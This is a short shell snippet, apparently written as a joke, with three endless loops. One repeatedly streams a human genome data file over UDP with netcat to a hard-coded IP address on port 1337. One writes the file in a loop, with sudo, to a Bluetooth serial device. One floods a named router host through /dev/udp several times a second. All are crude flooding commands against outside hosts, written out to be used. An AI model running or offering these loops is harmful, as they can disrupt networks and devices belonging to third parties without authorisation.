while true; do  echo "Flashing..." && (cat ./GRCh38_latest_genomic.fna | nc -u 176.106.59.11 1337; sleep 1) &&  echo "FLASHED uwu..."; done;

# This also works
while true; do sudo su -c "cat ./GRCh38_latest_genomic.fna > /dev/rfcomm0"; done;

# You can also do this
while true; do { echo \432 > /dev/udp/dlinkrouter.domain.lv/1337 & sleep 0.125; } done

